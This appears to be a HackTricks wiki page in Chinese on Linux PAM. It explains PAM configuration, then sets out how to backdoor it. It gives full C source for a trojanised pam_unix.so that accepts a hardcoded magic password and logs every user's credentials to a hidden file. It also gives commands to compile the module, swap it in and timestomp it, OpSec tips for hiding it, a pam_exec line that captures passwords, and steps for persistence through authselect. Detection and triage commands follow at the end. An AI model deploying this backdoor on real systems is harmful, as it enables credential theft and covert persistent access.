# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本信息

**PAM (Pluggable Authentication Modules)** 充当一种安全机制，用于**验证尝试访问计算机服务的用户身份**，并根据各种条件控制其访问权限。它类似于数字门卫，确保只有经过授权的用户才能使用特定服务，同时还可能限制其使用量，以防止系统过载。

#### 配置文件

- **Solaris 和基于 UNIX 的系统**通常使用位于 `/etc/pam.conf` 的中央配置文件。
- **Linux 系统**倾向于采用目录方式，将特定服务的配置存储在 `/etc/pam.d` 中。例如，login 服务的配置文件位于 `/etc/pam.d/login`。

login 服务的 PAM 配置示例可能如下所示：
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM 管理域**

这些域或管理组包括 **auth**、**account**、**password** 和 **session**，分别负责 authentication 和 session 管理过程的不同方面：

- **Auth**：验证用户身份，通常会提示输入密码。
- **Account**：处理 account 验证，检查组成员资格或时段限制等条件。
- **Password**：管理密码更新，包括复杂度检查或防止 dictionary attacks。
- **Session**：管理服务 session 开始或结束期间的操作，例如挂载目录或设置资源限制。

#### **PAM Module Controls**

Controls 决定 module 在成功或失败时的响应方式，并影响整体 authentication 过程。包括：

- **Required**：required module 失败会最终导致失败，但只有在检查完所有后续 modules 后才会发生。
- **Requisite**：失败后立即终止过程。
- **Sufficient**：成功后跳过同一 realm 中剩余的检查，除非后续 module 失败。
- **Optional**：只有当它是 stack 中唯一的 module 时，才会导致失败。

#### Offensive Semantics That Matter

在 backdooring PAM 时，**插入 rule 的位置**通常比 payload 本身更重要：

- `include` 和 `substack` 会从其他文件中引入 rules，因此编辑 `sshd` 可能只影响 SSH，而编辑 `system-auth`、`common-auth` 或其他共享 stack 则会同时影响多个 services。
- PAM 还支持类似 `[success=1 default=ignore]` 的 bracketed controls。这些 controls 可在 custom check 成功后跳过一个或多个 modules，而不是明显替换 `pam_unix.so`。
- `module-path` 可以是**绝对路径**（`/usr/lib/security/pam_custom.so`），也可以是相对于默认 PAM module directory 的**相对路径**。在现代 Linux systems 中，实际目录通常是 `/lib/security`、`/lib64/security`、`/usr/lib/security`，或类似 `/usr/lib/x86_64-linux-gnu/security` 的 multiarch paths。

Quick operator takeaway：在 patching 之前，始终映射**完整的 service graph**。例如，某些 distros 使用 `sshd -> password-auth -> system-auth`，而其他 distros 使用 `sshd -> system-remote-login -> system-login -> system-auth`，这意味着同一个单行 implant 的影响范围可能远大于预期。

#### Example Scenario

在包含多个 auth modules 的 setup 中，过程会严格按照顺序执行。如果 `pam_securetty` module 发现 login terminal 未获授权，则会阻止 root logins，但由于其状态为 "required"，所有 modules 仍会继续处理。`pam_env` 会设置 environment variables，可能改善 user experience。`pam_ldap` 和 `pam_unix` modules 会协同完成 user authentication，其中 `pam_unix` 会尝试使用之前提供的密码，从而提高 authentication methods 的效率和灵活性。


## Backdooring PAM – Hooking `pam_unix.so`

在高价值 Linux environments 中，一种经典的 persistence 技巧是**用 trojanised drop-in 替换 legitimate PAM library**。由于每次 SSH / console login 最终都会调用 `pam_unix.so:pam_sm_authenticate()`，只需几行 C 代码就足以 capture credentials 或实现 *magic* password bypass。

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

编译并隐蔽替换：
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Tips
1. **Atomic overwrite** – 写入临时文件，然后使用 `mv` 将其移动到目标位置，以避免生成会导致 SSH 被锁定的半写入 libraries。
2. 将日志文件放置在 `/usr/bin/.dbus.log` 等位置，可与合法的桌面 artefacts 融为一体。
3. 保持 symbol exports 一致（`pam_sm_setcred` 等），以避免 PAM 出现异常行为。

### Detection
* 将 `pam_unix.so` 的 MD5/SHA256 与 distro package 进行比对。
* 使用 `rpm -V pam` 或 `debsums -s libpam-modules`，无需手动计算 hash 即可发现被替换的 libraries。
* 检查 `/lib/security/` 下是否存在 world-writable 文件或异常的 ownership。
* `auditd` 规则：`-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* 使用 grep 检查 PAM 配置中是否存在意外 modules：`grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

### Quick triage commands（post-compromise 或 threat hunting）
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### 利用 `pam_exec` 实现 persistence
与替换 `pam_unix.so` 不同，一种更轻量的做法是在 `/etc/pam.d/sshd` 中追加一行 `pam_exec`，使每次 SSH 登录都会启动一个 implant，同时保留正常的认证栈：
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` 会通过环境变量接收 PAM 元数据，例如 `PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY` 和 `PAM_TYPE`。使用 `expose_authtok` 时，helper 还可以在 `auth` 或 `password` 阶段从 `stdin` 读取密码。如果希望 helper 使用 effective UID 而非 real UID 运行，请添加 `seteuid`。

实践注意事项：

- `session optional pam_exec.so ...` 更适合执行**登录后的操作**，例如重新打开 sockets 或生成 detached daemon。
- `auth optional pam_exec.so quiet expose_authtok ...` 通常用于**credential capture**，因为它会在 session 打开之前运行。
- 可以使用 `type=session` 或 `type=auth` 将执行限制在特定的 PAM 阶段，从而避免产生嘈杂的重复执行。

### 在 distro tooling 中持久生效：`authselect`

在 RHEL、CentOS Stream、Fedora 及其衍生系统上，直接修改 `/etc/pam.d/system-auth` 或 `/etc/pam.d/password-auth` 等生成文件，可能会被 `authselect` **覆盖**。为了持久生效，operators 通常会修改 `/etc/authselect/custom/<profile>/` 下的 active custom profile，然后重新选择或应用该 profile。

拥有 root 权限时的典型工作流程：
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
这对于攻击和分诊都很重要：如果 `/etc/pam.d/system-auth` 包含横幅 `Generated by authselect` 和 `Do not modify this file manually`，那么真正的持久化位置可能位于 `/etc/authselect/custom/`，而不是 `/etc/pam.d/`。

### 近期在野外发现的实战技法

2025 年近期关于 **Plague** Linux backdoor 的报告显示，同一核心思路被进一步发展：使用带有**静态绕过密码**的恶意 PAM 组件，同时清理与 SSH 相关的环境变量和 shell history（`HISTFILE=/dev/null`），以减少登录后的会话痕迹。这是一个有用的 hunting pattern，因为 backdoor 逻辑可能位于 PAM 中，而 stealth artifacts 只会在 authentication 成功后出现。


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM 手册](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague：新发现的基于 PAM 的 Linux backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
